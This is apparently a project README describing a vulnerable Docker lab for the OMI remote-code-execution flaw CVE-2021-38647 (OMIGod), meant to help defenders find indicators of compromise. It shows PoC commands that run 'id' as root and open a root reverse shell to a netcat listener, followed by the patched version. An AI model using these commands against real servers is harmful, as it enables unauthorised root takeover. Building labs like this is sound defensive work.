# Details
## OMIGod - CVE-2021-38647
Open Management Infrastructure (OMI, formerly known as NanoWBEM) is an open source Common Interface Model (CMI) management server by Microsoft and The Open Group. OMI is a software agent found on most of Azure's Linux VMs, yet many do not know of it's presence.

On September 14th the Wiz Research Team published an article detailing four vulnerabilities in OMI. The vulnerabilities are described as easy to exploit, and can allow attackers arbitrary remote code execution and escalation to root with a single request.

### Details of CVE-2021-38647
CVE-2021-38647 is an unauthenticated RCE vulnerability exploited by sending a crafted HTTP request. CVE-2021-38647 allows an attacker to run commands as the user of the OMI agent, normally root.

OMI agents are widely used on Azure Linux servers when these services are in use:
* Azure Automation
* Azure Automatic Update
* Azure Operations Management Suite
* Azure Log Analytics
* Azure Configuration Management
* Azure Diagnostics

According to Microsoft most Azure services that use OMI deploy it **without** exposing the HTTP/S port.

## Goal of this project
The goal of this project is to create a demo environment in a easily replicable way so that Blue teams more easily can find IoC's. To accomplish this goal I create a custom docker image set up with the vulnerable version of OMI.

# Usage
Depending on your setup, this might require sudo.
```bash
# Building the docker container
docker build . -t omi-god

# Running it
docker run --name=omi-god -it omi-god
```
You will now have a the root terminal up for the docker container. You should get the ip address of the docker container, which can be done with the command:
```bash
# Add it to clipboard
docker inspect omi-god | jq ".[0].NetworkSettings.Networks.bridge.IPAddress" | cut -d\" -f2 | xclip -selection clipboard

# Show it in terminal
docker inspect omi-god | jq ".[0].NetworkSettings.Networks.bridge.IPAddress" | cut -d\" -f2
```

When this is set up, you can try to run any PoCs. To run the one in this project, run the following commands:
```bash
# Execute any command as root
python3 omigod.py -t 172.17.0.2 -c id 
 -> uid=0(root) gid=0(root) groups=0(root)

# Get a reverse shell as root on the server
python3 omigod.py -t 172.17.0.2 -r -l 172.17.0.1 -p 4444 & nc -lnvp 4444 
```

# Affected versions
All OMI versions below v1.6.8-1 are vulnerable.

# Mitigations
There has been published a patched version that fixed this exploit. Update and ensure the version is 1.6.8.1 or above.
